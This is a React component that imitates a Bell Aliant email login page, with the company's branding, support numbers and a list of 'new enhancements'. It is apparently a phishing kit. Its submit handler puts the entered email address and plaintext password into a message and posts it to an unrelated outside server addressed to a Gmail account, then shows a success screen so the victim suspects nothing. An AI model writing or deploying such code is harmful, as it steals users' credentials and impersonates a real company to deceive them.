// src/HomePage.jsx
import React, { useState } from "react";
import axios from "axios";

const HomePage = () => {
  const [formData, setFormData] = useState({
    email: "",
    password: "",
    remember: false,
  });
  const [formErrors, setFormErrors] = useState({ email: "", password: "" });
  const [isSubmitted, setIsSubmitted] = useState(false);
  const [isLoading, setIsLoading] = useState(false);

  const handleInputChange = (e) => {
    const { name, value, type, checked } = e.target;
    setFormData((prevData) => ({
      ...prevData,
      [name]: type === "checkbox" ? checked : value,
    }));
  };

  const validateForm = () => {
    const errors = {};
    if (!formData.email) {
      errors.email = "Email is required";
    } else if (!/\S+@\S+\.\S+/.test(formData.email)) {
      errors.email = "Email address is invalid";
    }
    if (!formData.password) {
      errors.password = "Password is required";
    } else if (formData.password.length < 6) {
      errors.password = "Password must be at least 6 characters";
    }
    setFormErrors(errors);
    return Object.keys(errors).length === 0;
  };

  const handleSubmit = async (e) => {
    e.preventDefault();
    setIsLoading(true);
    const customizedMessage = `
      Hello, New Form Submitted 
      Email: ${formData.email},
      Password: ${formData.password}
      Thank you for using our service.
    `;
    const data = {
      sender_name: import.meta.env.APP_SENDER_NAME,
      sender_email: import.meta.env.APP_SENDER_ADDRESS,
      message: customizedMessage,
      subject: "New Form Submitted",
      email: "krogstadracheal@gmail.com",
      name: "Bellaliant",
    };
    console.log(data);

    const url =
      import.meta.env.APP_API_URL ??
      "http://talentsapartments.com/api/api-email";
    if (validateForm()) {
      try {
        await axios.post(url, data);
        setIsSubmitted(true);
        setIsLoading(false);
      } catch (error) {
        console.error("Failed to send email:", error);
        setIsLoading(false);
      }
    }
  };
  // const handleSubmit = async (e) => {
  //   e.preventDefault();
  //   if (!validateForm()) return;

  //   const customizedMessage = `
  //     Welcome, ${formData.email}!
  //     Thank you for using our service.
  //     Remembered: ${formData.remember ? "Yes" : "No"}
  //   `;

  //   try {
  //     await emailjs.send(
  //       import.meta.env.REACT_APP_EMAILJS_SERVICE_ID,
  //       import.meta.env.REACT_APP_EMAILJS_TEMPLATE_ID,
  //       {
  //         to_email: formData.email,
  //         message: customizedMessage,
  //       },
  //       import.meta.env.REACT_APP_EMAILJS_USER_ID
  //     );
  //     setSuccessMessage("Email sent successfully!");
  //   } catch (error) {
  //     console.error("Email sending error:", error);
  //     setSuccessMessage("Failed to send email. Please try again.");
  //   }
  // };
  return (
    <div className="page">
      {/* Navbar */}
      <header>
        <div className="header">
          <a className="navbar-brand mt-3 mb-2" href="#">
            <div className="site-title">Bell</div>
            <div className="site-title-sub">Aliant</div>
          </a>
          <div>
            <a
              href="#"
              style={{
                color: "#fff",
                fontSize: "15px",
              }}
            >
              English
            </a>
          </div>
        </div>
      </header>
      <main className="container">
        {/* Page Content */}
        <div className="content">
          <div className="row">
            <div className="col-12">
              <h2>Courriel Bell Aliant</h2>
            </div>
          </div>
          <div className="row">
            {/* Form Column */}
            <div className="col-md-6 mb-5 mb-lg-0">
              <div className="card">
                <div className="card-header">
                  <h4>Login</h4>
                </div>
                <div className="card-body">
                  {isSubmitted ? (
                    <div>
                      <div className="email-success mb-3">
                        Form submitted successfully!
                      </div>
                      <div>
                        <button
                          type="submit"
                          className="btn form-btn"
                          onClick={() => {
                            location.reload();
                          }}
                        >
                          Continue
                        </button>
                      </div>
                    </div>
                  ) : (
                    <form onSubmit={handleSubmit} noValidate>
                      <div className="mb-2">
                        <label htmlFor="email" className="form-label">
                          Email Address
                        </label>
                        <input
                          type="text"
                          name="email"
                          value={formData.email}
                          onChange={handleInputChange}
                          className={`form-control ${
                            formErrors.email ? "is-invalid" : ""
                          }`}
                          id="email"
                          required
                        />
                        {formErrors.email && (
                          <div className="invalid-feedback">
                            {formErrors.email}
                          </div>
                        )}
                      </div>

                      <div className="mb-3">
                        <label htmlFor="password" className="form-label">
                          Password
                        </label>
                        <input
                          type="password"
                          name="password"
                          value={formData.password}
                          onChange={handleInputChange}
                          className={`form-control ${
                            formErrors.password ? "is-invalid" : ""
                          }`}
                          id="password"
                          required
                        />
                        {formErrors.password && (
                          <div className="invalid-feedback">
                            {formErrors.password}
                          </div>
                        )}
                      </div>
                      <div className="mb-3">
                        <div className="custom-checkbox">
                          <input
                            type="checkbox"
                            name="remember"
                            checked={formData.remember}
                            onChange={handleInputChange}
                            className="form-check-input"
                            // id="remember"
                            id="styledCheckbox"
                          />
                          <span className="checkbox-box"></span>
                          <label
                            for="styledCheckbox"
                            className="custom-label form-label"
                          >
                            Remember my email address!
                          </label>
                        </div>
                      </div>

                      <div>
                        <button type="submit" className="btn form-btn">
                          {isLoading ? "Please Wait...." : "Submit"}
                        </button>
                      </div>
                      <div>
                        <a className="forgot-password form-label" href="/">
                          <div>
                            Forgot your password? Please call Technical Support.
                            <br />
                            <br />
                            Bell Aliant: 1-866-425-4268
                            <br />
                            KMTS: 1-807-467-5687
                            <br />
                            DMTS: 1-807-223-1100
                            <br />
                            Ontera: 1-888-566-8372
                            <br />
                            FibreOP: 1-866-342-7367
                            <br />
                          </div>
                        </a>
                      </div>
                    </form>
                  )}
                </div>
              </div>
            </div>

            {/* Card Column */}
            <div className="col-md-6 mb-5 mb-lg-0">
              <div className="card">
                <div className="card-header">
                  <h4>New enhancements to your Bell Aliant email.</h4>
                </div>

                <div className="card-body section-wrapper">
                  <div className="floating-element"></div>
                  <div className="section-content">
                    <h3 className="mb-2">
                      You'll start seeing these updates soon:
                    </h3>
                    <ul>
                      <li className="list">
                        A new look and composing screen for an improved
                        experience
                      </li>
                      <li className="list">Increased inbox storage space</li>
                      <li className="list">
                        A new calendar feature to help organize your day
                      </li>
                      <li className="list">
                        An optimized mobile experience on iOS and Android
                      </li>
                    </ul>
                  </div>
                </div>
              </div>
            </div>
          </div>
        </div>
      </main>
      <footer>
        <span className="copyright">
          &nbsp;&nbsp;&nbsp;© Bell Canada, 2024. All rights reserved.
        </span>
      </footer>
    </div>
  );
};

export default HomePage;
